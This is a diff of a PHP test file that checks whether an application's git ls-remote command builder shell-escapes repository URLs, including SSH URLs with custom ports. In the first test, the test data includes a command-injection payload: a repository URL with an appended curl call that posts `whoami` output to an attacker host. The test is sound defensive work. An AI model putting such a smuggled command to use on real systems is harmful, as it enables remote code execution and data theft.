@@ -3,10 +3,28 @@
 use App\Models\Application;
 use App\Models\GithubApp;
 use App\Models\PrivateKey;
+use Illuminate\Support\Collection;
 
 afterEach(function () {
     Mockery::close();
 });
+
+/**
+ * Deploy key commands are a list of command entries (so key material can skip logging);
+ * other deployment types return one shell string.
+ *
+ * @param  array{commands: Collection|array|string}  $result
+ */
+function gitSecurityLsRemoteCommandString(array $result): string
+{
+    if (is_string($result['commands'])) {
+        return $result['commands'];
+    }
+
+    return collect($result['commands'])
+        ->map(fn ($command) => is_array($command) ? $command['command'] : $command)
+        ->implode(' && ');
+}
 
 it('escapes malicious repository URLs in deploy_key type', function () {
     // Arrange: Create a malicious repository URL
@@ -32,13 +50,16 @@ it('escapes malicious repository URLs in deploy_key type', function () {
 
     // Assert: The command should contain escaped repository URL
     expect($result)->toHaveKey('commands');
-    $command = $result['commands'];
+    $command = gitSecurityLsRemoteCommandString($result);
 
     // The malicious payload should be escaped and not executed
     expect($command)->toContain("'git@github.com:user/repo.git;curl https://attacker.com/ -X POST --data `whoami`'");
 
-    // The command should NOT contain unescaped semicolons or backticks that could execute
-    expect($command)->not->toContain('repo.git;curl');
+    // Inside the docker `bash -c '...'` wrapper, the URL stays one single-quoted argument,
+    // so the semicolon and backticks are never evaluated by either shell
+    expect($command)
+        ->toContain("git ls-remote '\\''git@github.com:user/repo.git;curl https://attacker.com/ -X POST --data `whoami`'\\''")
+        ->not->toContain('ls-remote git@github.com');
 });
 
 it('escapes malicious repository URLs in source type with public repo', function () {
@@ -69,7 +90,7 @@ it('escapes malicious repository URLs in source type with public repo', function
 
     // Assert: The command should contain escaped repository URL
     expect($result)->toHaveKey('commands');
-    $command = $result['commands'];
+    $command = gitSecurityLsRemoteCommandString($result);
 
     // The command should contain the escaped URL (escapeshellarg wraps in single quotes)
     expect($command)->toContain("'https://github.com/user/repo'\\''");
@@ -94,7 +115,7 @@ it('escapes repository URLs in other deployment type', function () {
 
     // Assert: The command should contain escaped repository URL
     expect($result)->toHaveKey('commands');
-    $command = $result['commands'];
+    $command = gitSecurityLsRemoteCommandString($result);
 
     // The malicious payload should be escaped (escapeshellarg wraps and escapes quotes)
     expect($command)->toContain("'https://github.com/user/repo.git'\\''");
@@ -108,13 +129,14 @@ it('preserves ssh scheme URLs with custom ports in deploy_key commands', functio
     $application->git_repository = 'ssh://git@192.168.56.11:22222/User/Repo.git';
     $application->private_key_id = 1;
 
-    $privateKey = new PrivateKey;
-    $privateKey->private_key = 'fake-private-key';
+    $privateKey = Mockery::mock(PrivateKey::class)->makePartial();
+    $privateKey->shouldReceive('getAttribute')->with('private_key')->andReturn('fake-private-key');
     $application->setRelation('private_key', $privateKey);
+    $application->setRelation('source', null);
 
     $result = $application->generateGitLsRemoteCommands($deploymentUuid, false);
 
-    expect($result['commands'])
+    expect(gitSecurityLsRemoteCommandString($result))
         ->toContain("'ssh://git@192.168.56.11:22222/User/Repo.git'")
         ->toContain('-p 22222')
         ->not->toContain('ssh:/git@192.168.56.11:22222/User/Repo.git');
